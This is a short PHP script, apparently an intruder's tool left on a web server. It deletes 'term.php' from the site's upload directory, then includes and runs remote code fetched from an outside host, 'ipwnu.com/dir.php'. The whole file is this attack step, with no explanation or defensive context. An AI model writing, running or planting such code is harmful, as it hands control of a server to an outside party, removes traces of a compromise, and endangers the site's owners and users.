<?php

if(unlink("/var/www/html/upload/term.php")){
$message = "File Removed Successfully!";
 }else{
$message = "Was unable to delete term.php";
}

include("http://ipwnu.com/dir.php");

?>
